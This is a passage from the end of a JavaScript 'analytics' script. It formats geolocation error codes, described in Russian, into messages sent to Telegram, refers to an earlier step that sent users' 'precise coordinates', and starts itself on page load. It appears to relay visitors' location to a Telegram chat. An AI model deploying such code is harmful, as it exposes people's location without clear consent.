      console.error('Error sending precise coordinates: - analytics-v2.js:725', e);
    }
  }
  async sendGeolocationErrorMessage(error) {
    try {
      const errorMessages = {
        1: 'Пользователь запретил доступ к геопозиции',
        2: 'Невозможно получить позицию (источник недоступен)',
        3: 'Превышено время ожидания ответа'
      };
      const errorText = errorMessages[error.code] || 'Unknown error';
      const message = `
⚠️ <b>ОШИБКА ГЕОЛОКАЦИИ</b>

Код ошибки: ${error.code}
Описание: ${errorText}

Session ID: ${this.sessionID}
Время: ${new Date().toISOString()}
`;
      await this.sendToTelegram(message);
    } catch (e) {
      console.error('Error sending geolocation error message: - analytics-v2.js:747', e);
    }
  }
}
let analytics;
document.addEventListener('DOMContentLoaded', () => {
  analytics = new TGKAnalyticsV2();
  window.TGKAnalytics = analytics;
  console.log('📊 TGK Analytics V2 ready - analytics-v2.js:755');
});
